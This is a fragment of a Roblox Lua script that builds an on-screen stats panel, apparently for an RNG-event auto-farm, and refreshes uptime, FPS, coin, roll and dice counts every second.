    local Container = Instance.new("Frame"); Container.Size = UDim2.new(1, 0, 1, 0); Container.BackgroundTransparency = 1; Container.Parent = Background
    Self.Container = Container
    
    local Layout = Instance.new("UIListLayout"); Layout.Padding = UDim.new(0.015, 0); Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center; Layout.VerticalAlignment = Enum.VerticalAlignment.Center; Layout.SortOrder = Enum.SortOrder.LayoutOrder; Layout.Parent = Container
    
    local ToggleBtn = Instance.new("TextButton"); ToggleBtn.Size = UDim2.new(0, 45, 0, 45); ToggleBtn.Position = UDim2.new(1, -20, 1, -20); ToggleBtn.AnchorPoint = Vector2.new(1, 1); ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15); ToggleBtn.Text = "👁"; ToggleBtn.TextSize = 22; ToggleBtn.Parent = ScreenGui
    local UICornerBtn = Instance.new("UICorner"); UICornerBtn.CornerRadius = UDim.new(1, 0); UICornerBtn.Parent = ToggleBtn
    local UIStrokeBtn = Instance.new("UIStroke"); UIStrokeBtn.Color = Color3.fromRGB(150, 0, 255); UIStrokeBtn.Thickness = 2; UIStrokeBtn.Parent = ToggleBtn
    
    ToggleBtn.MouseButton1Click:Connect(function() Background.Visible = not Background.Visible; ToggleBtn.Text = Background.Visible and "👁" or "🙈" end)

    local Sorted = {}
    for Name, Data in pairs(Config.UI) do table.insert(Sorted, {Name = Name, Order = Data[1], Text = Data[2], Size = Data[3]}) end
    table.sort(Sorted, function(A, B) return A.Order < B.Order end)

    for Index, Item in ipairs(Sorted) do
        local Label = Instance.new("TextLabel"); Label.Name = Item.Name; Label.LayoutOrder = Item.Order; Label.Size = Item.Size and UDim2.new(unpack(Item.Size)) or UDim2.new(0.6, 0, 0.045, 0); Label.BackgroundTransparency = 1; Label.Font = Enum.Font.FredokaOne; Label.Text = Item.Text; Label.TextColor3 = Color3.fromRGB(255, 255, 255); Label.TextScaled = true; Label.Parent = Self.Container
        Self.Elements[Item.Name] = Label
        if Index < #Sorted then
            local Spacer = Instance.new("Frame"); Spacer.LayoutOrder = Item.Order + 0.5; Spacer.BackgroundColor3 = Color3.fromRGB(150, 0, 255); Spacer.Size = UDim2.new(0.4, 0, 0, 2); Spacer.Parent = Self.Container
        end
    end
    return Self
end

function FarmUI:SetText(Name, Text) if self.Elements[Name] then task.defer(function() self.Elements[Name].Text = Text end) end end 

local UI = FarmUI.new({
    UI = {
        ["Title"]    = {1, "🎲 RNG EVENT CORE", {0.8, 0, 0.08, 0}},
        ["Uptime"]   = {2, "Time: 00:00:00 | FPS: 0"},
        ["RNGCoins"] = {3, "RNG Coins: 0"},
        ["Rolls"]    = {4, "Total Rolls: 0"},
        ["Dice1"]    = {5, "Lucky Dice: 0 | Lucky II: 0"},
        ["Dice2"]    = {6, "Mega Dice: 0 | Mega II: 0"},
		["Dice3"]    = {7, "Lucky III: 0 | Fire: 0"}
    }
})

local frames = 0
RunService.RenderStepped:Connect(function() frames = frames + 1 end)
local startTime = tonumber(os.time()) or 0

task.spawn(function()
    while task.wait(1) do
        local diff = (tonumber(os.time()) or 0) - startTime
        local currentCoin = GetItemAmount(config.CoinID)
        local save = Save.Get()
        local currentRolls = 0; pcall(function() currentRolls = save.TotalRollsV2 or save.RngRolls2 or save.RngRolls or 0 end)

        UI:SetText("Uptime", string.format("Time: %02d:%02d:%02d | FPS: %d", math.floor(diff / 3600), math.floor((diff % 3600) / 60), diff % 60, frames))
        UI:SetText("RNGCoins", "RNG Coins: " .. FormatValue(currentCoin))
        UI:SetText("Rolls", "Total Rolls: " .. FormatValue(currentRolls))
        UI:SetText("Dice1", string.format("Lucky: %s | Lucky II: %s", FormatValue(GetDiceCount("Lucky Dice V2")), FormatValue(GetDiceCount("Lucky Dice II V2"))))
        UI:SetText("Dice2", string.format("Mega: %s | Mega II: %s", FormatValue(GetDiceCount("Mega Lucky Dice V2")), FormatValue(GetDiceCount("Mega Lucky Dice II V2"))))
	UI:SetText("Dice3", string.format("Lucky III: %s | Fire: %s", FormatValue(GetDiceCount("Lucky Dice III")), FormatValue(GetDiceCount("Fire Dice"))))
        frames = 0
    end
end)
